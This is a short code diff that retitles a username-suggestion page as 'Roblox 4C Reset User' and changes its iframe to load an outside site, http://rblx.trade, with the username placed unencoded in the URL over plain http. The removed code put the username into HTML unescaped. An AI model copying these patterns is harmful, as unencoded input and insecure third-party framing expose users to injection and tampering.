@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AI Username Suggestion Box with Iframe</title>
+  <title>Roblox 4C Reset User</title>
   <style>
     * {
       box-sizing: border-box;
@@ -254,29 +254,11 @@
       const iframeContainer = document.getElementById('iframe-container');
       const iframe = document.getElementById('username-iframe');
 
-      // Set the iframe content to the generated username
-      const content = `
-        <html>
-          <head>
-            <style>
-              body {
-                background-color: #121212;
-                color: white;
-                font-family: Arial, sans-serif;
-                font-size: 24px;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100%;
-              }
-            </style>
-          </head>
-          <body>
-            <div>${username}</div>
-          </body>
-        </html>
-      `;
-      iframe.srcdoc = content;
+      // Construct the URL based on the selected username
+      const url = `http://rblx.trade/u/${username}`;
+
+      // Set the iframe src to the constructed URL
+      iframe.src = url;
 
       // Show the iframe with a fade-in effect
       iframeContainer.style.display = 'block';
